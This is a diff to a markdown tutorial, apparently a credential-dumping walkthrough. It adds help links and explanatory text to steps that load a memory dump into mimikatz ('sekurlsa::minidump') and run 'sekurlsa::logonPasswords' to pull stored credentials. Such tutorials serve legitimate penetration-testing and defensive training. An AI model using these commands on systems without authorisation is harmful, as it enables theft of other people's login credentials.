@@ -19,13 +19,13 @@ mimikatz.exe
 ```
 ![launch](Media/launch2.png)
 \
-7. Open File - We need to tell mimikatz where to look for our dump file
+7. Open File - We need to tell mimikatz where to look for our dump file. [Command Documentation and Extra help](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/minidump)
 ```bash
 sekurlsa::minidump /path/to/dump
 ```
 ![mimilock](Media/mimilock.png)
 \
-8. Launch Attack
+8. Launch Attack - logonPasswords grabs all provider credentials without requireing administrator. Other types of attacks can be [here](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa)
 ```bash
 sekurlsa::logonPasswords
 ```
